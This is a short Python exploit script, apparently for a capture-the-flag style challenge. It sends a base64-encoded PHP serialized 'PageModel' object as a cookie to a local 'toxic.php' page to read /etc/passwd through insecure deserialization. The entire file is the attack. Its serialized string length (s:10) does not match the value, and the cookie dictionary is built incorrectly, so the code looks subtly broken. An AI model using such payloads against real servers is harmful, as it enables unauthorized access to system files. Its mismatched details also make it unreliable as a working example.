import requests
import base64


url ='http://localhost:8000/toxic.php'


coo = base64.b64encode(bytes('O:9:"PageModel":1:{s:4:"file";s:10:"glob("/etc/passwd")";}',"utf-8"))
print(str(coo))
cookie = {
	"Name":"PHPSESSID",
	"Value":coo
}

r = requests.get(url,cookies=cookie)

print(r.text)
